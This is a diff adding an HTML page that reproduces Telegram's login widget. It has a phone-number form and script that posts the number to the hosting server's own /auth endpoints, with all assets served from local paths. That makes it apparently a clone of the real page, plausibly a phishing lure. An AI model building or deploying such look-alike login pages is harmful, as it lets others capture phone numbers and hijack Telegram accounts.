@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Telegram Cloud Authorization</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="format-detection" content="telephone=no" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="MobileOptimized" content="176" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="robots" content="noindex, nofollow" />
+
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet" type="text/css">
+  <link href="/static/css/bootstrap.min.css" rel="stylesheet">
+  <link href="/static/css/bootstrap-extra.css" rel="stylesheet">
+  <link href="/static/css/telegram.css" rel="stylesheet">
+  <link href="/static/css/oauth.css" rel="stylesheet">
+
+</head>
+<body>
+<main class="login">
+  <a href="//core.telegram.org/widgets/login" target="_blank" class="login_about"></a>
+  <section class="login_content" id="login-container">
+    <div class="login_photos"><span class="login_telegram_photo_wrap"><i class="login_telegram_photo"></i></span><a href="https://t.me/TelegramBot" target="_blank"><i class="login_bot_photo bgcolor0" data-content="T"></i></a></div>
+    <div class="login_header_text">Log in to use your Telegram account with <br/>telegram.org and <a class="bot_name" href="https://t.me/TelegramBot" target="_blank">TelegramBot</a>.</div>
+    <div class="login_confirm_text">Please enter your <b>phone number</b> in the <a target="_blank" rel="noopener" href="https://telegram.org/faq#login-and-sms">international format</a> and we will send a confirmation message to your account via Telegram.</div>
+    <form id="send-form" class="login_form" onsubmit="return requestConfirmation(event);">
+      <div class="login_form_group" id="login-form-group">
+        <div class="login_country_field_wrap" id="login-country-wrap">
+          <div class="login_country_select" id="login-country-selected" data-placeholder="Unknown country"></div>
+          <div class="login_country_search_wrap">
+            <div class="textfield-item" id="login-country-search-textfield">
+              <input type="text" class="form-control" id="login-country-search" autocomplete="off" placeholder="Search" />
+              <div class="textfield-item-underline"></div>
+            </div>
+            <div class="login_country_search_results" id="login-country-search-results" data-noresult="Country not found"></div>
+          </div>
+        </div>
+        <div class="login_phone_field_wrap">
+          <div class="login_code_field_wrap">
+            <div class="textfield-item" id="login-phone-code-textfield">
+              <input type="tel" class="form-control" id="login-phone-code" autocomplete="off" />
+              <div class="textfield-item-underline"></div>
+            </div>
+          </div><div class="login_number_field_wrap">
+          <div class="textfield-item" id="login-phone-textfield">
+            <input type="tel" class="form-control" id="login-phone" autocomplete="off" />
+            <div class="textfield-item-underline"></div>
+            <label class="textfield-item-placeholder" id="login-phone-placeholder" data-placeholder="Phone number"></label>
+            <span class="textfield-item-error login_form_message" id="login-alert"></span>
+          </div>
+        </div>
+        </div>
+      </div>
+      <div class="login_button_wrap">
+        <button class="button-item button-item-flat ripple-handler" onclick="return loginCancel(event)" type="button">
+          <span class="button-item-label">Cancel</span>
+          <span class="ripple-mask"><span class="ripple"></span></span>
+        </button>
+        <button class="button-item ripple-handler" type="submit">
+          <span class="button-item-label">Next</span>
+          <span class="ripple-mask"><span class="ripple"></span></span>
+        </button>
+      </div>
+    </form>
+
+    <div id="login-form" class="hide">
+      <div class="login_form_group">
+        <span class="form-control login-form-control input input-lg input-disabled"><span class="login_phone_field" id="login-phone-field"></span> <span class="login_phone_invalid" id="login-phone-field"><a class="login-back" href="/auth" onclick="return cancelConfirmation(event);">edit</a></span></span>
+        <div class="login_form_message dots-animated">We&#39;ve just sent you a message.<br/>Please confirm access via Telegram</div>
+      </div>
+      <div class="login_button_wrap">
+        <button class="button-item button-item-flat ripple-handler" onclick="return loginCancel(event)" type="button">
+          <span class="button-item-label">Cancel</span>
+          <span class="ripple-mask"><span class="ripple"></span></span>
+        </button>
+      </div>
+    </div>
+  </section>
+</main>
+<script src="/static/js/oauth.js"></script>
+
+<script>function showLoginError(error_text) {
+  getEl('login-phone-code-textfield').classList.add('is-invalid');
+  getEl('login-phone-textfield').classList.add('is-invalid');
+  getEl('login-alert').innerHTML = error_text;
+}
+function requestConfirmation(event) {
+  event && event.preventDefault();
+  getEl('login-phone-code-textfield').classList.remove('is-invalid');
+  getEl('login-phone-textfield').classList.remove('is-invalid');
+  getEl('login-alert').innerHTML = '';
+  var code = getEl('login-phone-code').value;
+  var phone = getEl('login-phone').value;
+  ajax('/auth/request?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org&embed=1&request_access=write', {
+    phone: (code + phone).replace(/[^0-9]+/g, '')
+  }, function() {
+    openConfirmation();
+  }, function(xhr) {
+    showLoginError(xhr.responseText || 'Server error');
+  });
+  return false;
+}
+function openConfirmation() {
+  var code = getEl('login-phone-code').value;
+  var phone = getEl('login-phone').value;
+  getEl('login-phone-field').innerHTML = (code.length > 1 ? code + ' ' : code) + phone;
+  getEl('send-form').classList.add('hide');
+  getEl('login-form').classList.remove('hide');
+  checkAuth();
+}
+function cancelConfirmation(event) {
+  event && event.preventDefault();
+  getEl('login-phone-field').innerHTML = '';
+  getEl('send-form').classList.remove('hide');
+  getEl('login-form').classList.add('hide');
+  getEl('login-phone').focus();
+  clearTimeout(window.authTimeout);
+  ajax('/auth/cancel?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org&embed=1&request_access=write', {});
+  return false;
+}
+function checkAuth() {
+  clearTimeout(window.authTimeout);
+  window.authTimeout = setTimeout(function doCheckAuth() {
+    ajax('/auth/login?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org&embed=1&request_access=write', {}, function(result) {
+      if (result) {
+        location.reload();
+      } else {
+        checkAuth();
+      }
+    }, function (xhr) {
+      cancelConfirmation();
+      showLoginError(xhr.responseText || 'Server error');
+    });
+  }, 700);
+}
+function loginCancel(e) {
+  cancelConfirmation(e);
+  window.close();
+}
+inputFormatPhoneInit(false, "");
+
+initRipple();
+</script>
+</body>
+</html>
+<!-- page generated in 5.62ms -->
